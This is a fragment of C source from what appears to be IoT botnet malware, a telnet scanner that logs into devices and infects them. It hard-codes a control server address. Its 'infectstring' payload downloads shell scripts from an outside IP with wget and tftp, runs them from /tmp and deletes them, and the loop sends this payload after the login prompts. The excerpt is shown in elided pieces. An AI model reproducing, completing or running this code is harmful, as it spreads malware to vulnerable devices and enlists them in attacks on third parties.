...
{
        "179.43.144.42:443" //Start the server on this port
};
...
void StartTheLelz(int maxfds)
{
	int max = (getdtablesize() / 4) * 3, i, res, valopt;
	max = max > maxfds ? max : maxfds;
	// Make wget line a variable to use strlen() - Reason? I'm too lazy to do the character count each time it's changed
	char infectstring[450];
	sprintf(infectstring, "cd /tmp || cd /var/run;wget http://185.112.156.172/wbin.sh;sh wbin.sh;rm -rf wbin.sh;tftp -r tbin1.sh -g 185.112.156.172;sh tbin1.sh; tftp 185.112.156.172 -c get tbin2.sh; sh tbin2.sh; rm -rf tbin1.sh tbin2.sh wbin.sh\r\n";
	fd_set myset;
	struct timeval tv;
	socklen_t lon;
	struct sockaddr_in dest_addr;
	...
	{
		fds[i].complete = 1;
		fds[i].sockbuf = malloc(2048);
		memset(fds[i].sockbuf, 0, 2048);
	}
	...
	while (1)
	{
		for (i = 0; i < max; i++)
		{
			...
			{
				if (fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
				if (matchPrompt(fds[i].sockbuf)) fds[i].state = 7;
				if (readUntil(fds[i].fd, "ogin:", 0, 0, 5000, fds[i].sockbuf, 2048, fds[i].bufUsed))
				{
					fds[i].totalTimeout = 0;
					fds[i].bufUsed = 0;
					memset(fds[i].sockbuf, 0, 2048);
				...
				else fds[i].bufUsed = strlen(fds[i].sockbuf);
			...
			{
				if (fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
				if (readUntil(fds[i].fd, "assword:", 1, 0, 5000, fds[i].sockbuf, 2048, fds[i].bufUsed))
				{
					fds[i].totalTimeout = 0;
					fds[i].bufUsed = 0;
			...
			{
				if (fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
				if (readUntil(fds[i].fd, "ncorrect", 1, 0, 5000, fds[i].sockbuf, 2048, fds[i].bufUsed))
				{
					fds[i].totalTimeout = 0;
					fds[i].bufUsed = 0;
					if (strstr(fds[i].sockbuf, "ncorrect") != NULL)
			...
			{
				if (fds[i].totalTimeout == 0) fds[i].totalTimeout = time(NULL);
				if (send(fds[i].fd, infectstring, strlen(infectstring), MSG_NOSIGNAL) < 0)
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
				...
				if (fds[i].totalTimeout + 120 < time(NULL))
				{
					sclose(fds[i].fd);
					fds[i].state = 0;
					fds[i].complete = 1;
